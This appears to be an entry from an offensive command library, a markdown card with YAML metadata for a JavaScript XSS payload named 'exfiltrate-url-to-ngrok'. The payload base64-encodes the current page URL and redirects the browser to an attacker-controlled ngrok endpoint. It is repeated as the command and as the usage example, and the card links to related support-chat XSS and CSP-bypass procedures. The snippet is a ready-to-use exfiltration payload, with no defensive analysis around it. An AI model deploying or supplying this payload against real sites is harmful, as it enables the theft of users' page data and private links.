---
data: >-
  window.location
  ="https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
tags:
  - exfiltration
  - xss
type: command
output: Sends request to ngrok with encoded review URL
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.011Z'
id: 409418a3-0b29-4b3a-aa60-20f3d97278c8
verified: false
validated: true
submitted: true
---
# exfiltrate-url-to-ngrok

## Command

```javascript
window.location ="https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
```

## Description

JavaScript code hosted externally and loaded via XSS to exfiltrate the current page URL (e.g., support review) by base64-encoding it and redirecting to an attacker-controlled ngrok endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| data | Base64 encoded current URL | Yes |
| name | Parameter name (e.g., path) | Yes |

## Examples

### Basic Usage

```javascript
window.location ="https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
```

### Advanced Usage

Modify endpoint or add more data params.

## Expected Output

HTTP request to ngrok with query params containing encoded URL.

## Related

- [[commands/inject-xss-payload-support-chat]]
- [[procedures/CSP-Bypass-and-XSS-in-Support-Chat]]
